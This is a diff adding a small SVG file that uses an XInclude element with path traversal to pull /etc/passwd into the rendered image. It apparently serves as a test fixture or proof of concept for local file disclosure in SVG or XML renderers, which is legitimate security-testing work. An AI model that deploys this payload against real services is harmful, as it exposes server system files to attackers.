@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg width="300" height="300" xmlns:xi="http://www.w3.org/2001/XInclude">
+  <rect width="300" height="300" style="fill:rgb(255,255,255);" />
+  <text x="10" y="100">
+    <xi:include href=".?../../../../../../../../../../etc/passwd" parse="text" encoding="UTF-8">
+      <xi:fallback>file not found</xi:fallback>
+    </xi:include>
+  </text>
+</svg>
